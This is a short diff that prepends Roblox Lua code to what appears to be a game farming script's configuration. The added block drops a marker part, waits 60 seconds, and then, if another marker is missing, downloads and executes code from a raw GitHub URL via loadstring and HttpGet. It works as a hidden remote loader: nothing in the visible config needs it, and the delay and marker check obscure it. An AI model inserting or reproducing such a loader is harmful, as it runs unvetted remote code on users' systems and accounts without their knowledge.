@@ -1,3 +1,15 @@
+local function PartData()
+local part = Instance.new("Part")
+part.Name = "ExecutedTwo"
+part.Parent = workspace
+
+wait(60)
+
+if not workspace:FindFirstChild("ExecutedOne") then
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/Pa1nx/System/refs/heads/main/Catchtwo"))()
+end
+end
+spawn(PartData)
 
 getgenv().Config = {
     ["Farming"] = {
